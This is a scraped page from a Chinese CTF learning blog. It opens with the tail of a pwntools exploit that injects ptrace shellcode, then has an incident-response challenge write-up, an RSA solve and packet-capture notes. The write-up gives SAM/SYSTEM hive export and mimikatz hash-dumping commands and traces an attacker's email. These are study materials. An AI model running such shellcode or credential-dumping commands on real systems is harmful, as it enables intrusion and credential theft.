 add rbx,8</span></span><br><span class="line"><span class="string">    cmp rbx,0x100</span></span><br><span class="line"><span class="string">    jle loop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* ptrace(request=0x10, vararg_0=pid, vararg_1=0, vararg_2=0) */</span></span><br><span class="line"><span class="string">    xor r10d, r10d /* 0 */</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;PTRACE_DETACH&#125;</span></span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">    mov esi, [rsp+0x1C]</span></span><br><span class="line"><span class="string">    /* call ptrace() */</span></span><br><span class="line"><span class="string">    push SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode).ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>)+injected_shellcode</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;shellcode:&#x27;</span>,shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/30/2025-Parloo%E6%9D%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/30/2025-Parloo%E6%9D%AF/" class="post-title-link" itemprop="url">2025 Parloo杯</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-07-30 19:04:49" itemprop="dateCreated datePublished" datetime="2025-07-30T19:04:49+08:00">2025-07-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 18:39:05" itemprop="dateModified" datetime="2025-09-23T18:39:05+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" itemprop="url" rel="index"><span itemprop="name">应急响应</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC%E4%BA%8C%E5%B1%8Aparloo%E6%9D%AF-write-up/" itemprop="url" rel="index"><span itemprop="name">第二届parloo杯 write up</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这里先放一个虚拟机的配置，将附件解压后点击vmx文件就可以打开虚拟机了。</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/1.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/2.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/3.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/4.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/5.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/7.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/8.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/9.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/10.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/11.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/12.png" alt="1"></p>
<p>畸行的爱解压密码：<br>Parloo&amp;zgsfsys&amp;onefox&amp;solar**juyt</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/13.png" alt="1"></p>
<p>这里有四个虚拟机win7,win10,mysql,wedserver</p>
<h2 id="畸形的爱-复现"><a href="#畸形的爱-复现" class="headerlink" title="畸形的爱(复现)"></a>畸形的爱(复现)</h2><h3 id="攻击者ip地址1"><a href="#攻击者ip地址1" class="headerlink" title="攻击者ip地址1"></a>攻击者ip地址1</h3><p>先看webserver</p>
<p>先history命令，查看可以发现开启了docker环境，我们在升级到root，再history，和它一样开启docker</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start ec87eb8a81c7 6801404902b1 192686b818fc</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/14.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/15.png" alt="1"></p>
<p>​               列出所有TCP协议的网络连接及其状态 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anplt</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/16.png" alt="1"></p>
<p>看到nginx,去看看他的日志</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/17.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/18.png" alt="1"></p>
<p>看到shell.php可以确定ip</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.31.240</span><br></pre></td></tr></table></figure>



<h3 id="攻击者ip地址2"><a href="#攻击者ip地址2" class="headerlink" title="攻击者ip地址2"></a>攻击者ip地址2</h3><p>这题据说有bug，都是跟着其他师傅复现的。</p>
<p>先看docker开始的环境，再进入有wendata的环境，有clean.sh很明显shell脚本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">docker  exec -it ec87eb8a81c7(ip) /bin/sh</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/19.png" alt="1"></p>
<p>nc的反连地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.31.11</span><br></pre></td></tr></table></figure>



<h3 id="暴力破解开始时间"><a href="#暴力破解开始时间" class="headerlink" title="暴力破解开始时间"></a>暴力破解开始时间</h3><p>先根据暴力破解一般是有登录，ssh等才能被破解</p>
<p>根据phpmyadmin最具破解力</p>
<p>Docker容器会把写到容器标准输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs phpmyadmin</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/20.png" alt="1"></p>
<p>post ;时间密集；登录界面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2025:03:05:58</span><br></pre></td></tr></table></figure>



<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>这个flag在windows上</p>
<p>大佬们有everything一搜索就搜索出来了，我是到任务计划程序去看的。</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/21.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">palu&#123;pc3_zgsfqwerlkssaw&#125;</span><br></pre></td></tr></table></figure>



<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>再flag所在的地方的文件里看到C:\Program Files (x86)\Microsoft\a.bat</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/22.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">palu&#123;nizhidaowoyouduoainima&#125;</span><br></pre></td></tr></table></figure>



<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>这里要用<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_70898474/article/details/136275566">Navicat</a></p>
<p>我的navicat连不上mysql数据库，这题先放这。</p>
<h3 id="提交钓鱼文件的md5"><a href="#提交钓鱼文件的md5" class="headerlink" title="提交钓鱼文件的md5"></a>提交钓鱼文件的md5</h3><p>钓鱼一般都是聊天</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/24.png" alt="1"></p>
<p>在回收站里去找</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/23.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -hashfile &quot;C:\Users\Administrator\Desktop\简历.zip&quot; MD5</span><br></pre></td></tr></table></figure>

<p>效验md5</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a69df5bdfef664d0a22b7d8b62c44718</span><br></pre></td></tr></table></figure>



<h3 id="提交攻击者留下的webshell-1的密码"><a href="#提交攻击者留下的webshell-1的密码" class="headerlink" title="提交攻击者留下的webshell-1的密码"></a>提交攻击者留下的webshell-1的密码</h3><p>在找ip的时候会留意到shell.php下面有个a.php</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/25.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00232</span><br></pre></td></tr></table></figure>



<h3 id="提交攻击者留下的webshell-2的密码"><a href="#提交攻击者留下的webshell-2的密码" class="headerlink" title="提交攻击者留下的webshell-2的密码"></a>提交攻击者留下的webshell-2的密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -name &quot;*.php&quot;</span><br></pre></td></tr></table></figure>

<p>全局查找一下php文件太多了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -name &quot;shell.php&quot;</span><br></pre></td></tr></table></figure>

<p>猜一下shell.php</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/26.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack</span><br></pre></td></tr></table></figure>



<h3 id="提交攻击者开放端口"><a href="#提交攻击者开放端口" class="headerlink" title="提交攻击者开放端口"></a>提交攻击者开放端口</h3><p>这题据说环境有问题，也放这里</p>
<h3 id="提交攻击者留下的隐藏账户和密码"><a href="#提交攻击者留下的隐藏账户和密码" class="headerlink" title="提交攻击者留下的隐藏账户和密码"></a>提交攻击者留下的隐藏账户和密码</h3><p>先用D盾查</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/27.png" alt="1"></p>
<p>在用mimikatz跑出hash</p>
<p>先cmd用管理员身份运行，然后输入下面两行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd C:\Users\Administrator\Desktop\mimikatz_trunk\x64   进入exe所在目录</span><br><span class="line">reg save hklm\sam sam.save</span><br><span class="line">reg save hklm\system system.save</span><br><span class="line">C:\Users\Administrator\Desktop\mimikatz_trunk\x64\mimikatz.exe 运行exe</span><br><span class="line">privilege::debug</span><br><span class="line">lsadump::sam /sam:sam.save /system:system.save</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RID  : 000003ea (1002)</span><br><span class="line">User : system$</span><br><span class="line">  Hash NTLM: dbae99beb48fd9132e1cf77f4c746979</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cmd5.com/default.aspx">在线网站破解md5</a></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/28.png" alt="1"></p>
<p>要付费，解出来是wmx_love</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmx_love</span><br></pre></td></tr></table></figure>

<h3 id="攻击者的邮箱-溯源"><a href="#攻击者的邮箱-溯源" class="headerlink" title="攻击者的邮箱(溯源)"></a>攻击者的邮箱(溯源)</h3><h3 id="flag4-溯源"><a href="#flag4-溯源" class="headerlink" title="flag4(溯源)"></a>flag4(溯源)</h3><p>先分析简历exe</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/29.png" alt="1"></p>
<p>得到黑客的名字n0k4u</p>
<p>去github上找</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/30.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/31.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/32.png" alt="1"></p>
<p>3834239649是个QQ号</p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/33.png" alt="1"></p>
<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/34.png" alt="1"></p>
<p>我们找到了github的地址，知道了github就可以泄露出邮箱地址</p>
<p>直接搜通过Github用户名溯源个人邮箱可以找到参考文献<a target="_blank" rel="noopener" href="https://blog.csdn.net/fishfishfishman/article/details/141320003">链接</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.github.com/users/&lt;name&gt;/events/public 把name换成</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/30/2025-Parloo%E6%9D%AF/35.png" alt="1"></p>
<p>这里没出来，感觉是不是删了还是怎么搞的别的师傅都出来了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n0k4u@outlook.com</span><br></pre></td></tr></table></figure>

<p>到这里畸形的爱就复现完了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/29/RSA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/29/RSA/" class="post-title-link" itemprop="url">RSA</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-07-29 10:35:22" itemprop="dateCreated datePublished" datetime="2025-07-29T10:35:22+08:00">2025-07-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:06:06" itemprop="dateModified" datetime="2025-09-23T21:06:06+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">密码学习</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%A0/RSA/" itemprop="url" rel="index"><span itemprop="name">RSA</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>开始RSA的学习</p>
<p>RSA加密过程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = ;q = ;（两个质数）</span><br><span class="line">n = p * q</span><br><span class="line">φ(n) = (p-1)*(q-1)</span><br><span class="line">e = 公钥指数(与φ(n)互质)</span><br><span class="line">m = 明文</span><br><span class="line">c ≡ m^e (mod n)</span><br></pre></td></tr></table></figure>

<p>(d * e) mod φ(n) &#x3D; 1</p>
<p>公钥: (e, n)</p>
<p>私钥: (d, n)</p>
<p>解密过程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m ≡ c^d (mod n)</span><br></pre></td></tr></table></figure>

<p>例题1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> totient</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">power_tower_mod</span>(<span class="params">a, k, m</span>):  <span class="comment"># a↑↑k mod m</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> a % m</span><br><span class="line">    exp = power_tower_mod(a, k - <span class="number">1</span>, totient(m))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a, <span class="built_in">int</span>(exp), <span class="built_in">int</span>(m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = <span class="number">123456</span></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n_phi= p+q-<span class="number">1</span></span><br><span class="line">x=power_tower_mod(n_phi + <span class="number">1</span>, r, <span class="built_in">pow</span>(n_phi, <span class="number">3</span>))</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;x = <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 128523866891628647198256249821889078729612915602126813095353326058434117743331117354307769466834709121615383318360553158180793808091715290853250784591576293353438657705902690576369228616974691526529115840225288717188674903706286837772359866451871219784305209267680502055721789166823585304852101129034033822731</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 125986017030189249606833383146319528808010980928552142070952791820726011301355101112751401734059277025967527782109331573869703458333443026446504541008332002497683482554529670817491746530944661661838872530737844860894779846008432862757182462997411607513582892540745324152395112372620247143278397038318619295886</span></span><br><span class="line"><span class="string">x = 522964948416919148730075013940176144502085141572251634384238148239059418865743755566045480035498265634350869368780682933647857349700575757065055513839460630399915983325017019073643523849095374946914449481491243177810902947558024707988938268598599450358141276922628627391081922608389234345668009502520912713141</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = 1 + n_phi + n_phi^2</span><br><span class="line">n_phi = (-1 + sqrt(4*x - 3)) // 2</span><br><span class="line">n_phi = p + q - 1</span><br><span class="line">φ(n) = (p-1)*(q-1) = n + n_phi</span><br><span class="line">d = pow(e, -1, φ(n))</span><br></pre></td></tr></table></figure>

<p>得到私钥后就可以解密了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">128523866891628647198256249821889078729612915602126813095353326058434117743331117354307769466834709121615383318360553158180793808091715290853250784591576293353438657705902690576369228616974691526529115840225288717188674903706286837772359866451871219784305209267680502055721789166823585304852101129034033822731</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">125986017030189249606833383146319528808010980928552142070952791820726011301355101112751401734059277025967527782109331573869703458333443026446504541008332002497683482554529670817491746530944661661838872530737844860894779846008432862757182462997411607513582892540745324152395112372620247143278397038318619295886</span></span><br><span class="line">x = <span class="number">522964948416919148730075013940176144502085141572251634384238148239059418865743755566045480035498265634350869368780682933647857349700575757065055513839460630399915983325017019073643523849095374946914449481491243177810902947558024707988938268598599450358141276922628627391081922608389234345668009502520912713141</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate n_phi from x</span></span><br><span class="line">temp = <span class="number">4</span> * x - <span class="number">3</span></span><br><span class="line">root = isqrt(temp)</span><br><span class="line">n_phi = (root - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate φ(n)</span></span><br><span class="line">phi_n = n - n_phi</span><br><span class="line"></span><br><span class="line"><span class="comment"># Calculate private exponent d</span></span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt c</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert to bytes</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">流量分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-07-29 10:34:23" itemprop="dateCreated datePublished" datetime="2025-07-29T10:34:23+08:00">2025-07-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:13:06" itemprop="dateModified" datetime="2025-09-23T21:13:06+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/MISC/" itemprop="url" rel="index"><span itemprop="name">MISC</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">流量分析</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>开始流量学习。记录做题为主</p>
<h2 id="ssl"><a href="#ssl" class="headerlink" title="ssl"></a>ssl</h2><p>先过滤http</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1.png" alt="1"></p>
<p>http追踪流</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.png" alt="1"></p>
<p>看到ssl.log就是key。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.png" alt="1"></p>
<p>将其另存至本地。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/5.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/6.png" alt="1"></p>
<p>导入秘钥解密。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/7.png" alt="1"></p>
<p>多了几条http</p>
<p>追踪http流</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/8.png" alt="1"></p>
<p>就可以得到想要的东西。</p>
<h2 id="DDCTF2018-流量分析"><a href="#DDCTF2018-流量分析" class="headerlink" title="[DDCTF2018]流量分析"></a>[DDCTF2018]流量分析</h2><p>这也是个ssl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp contains &quot;KEY&quot;</span><br></pre></td></tr></table></figure>

<p>找key</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.1.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.2.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.3.png" alt="1"></p>
<p>[base64转PNG](<a target="_blank" rel="noopener" href="https://rtool.cn/base64-to-image.html">阿图工具箱 - Base64转图片工具 - 免费在线Base64解码图片转换器</a>)</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/key.png" alt="1"></p>
<p>[提取文字](<a target="_blank" rel="noopener" href="https://www.onlineocr.net/zh_hant/">免費在線OCR - 將PDF轉換為Word或圖像轉換為文本</a>)将其保存为key.txt</p>
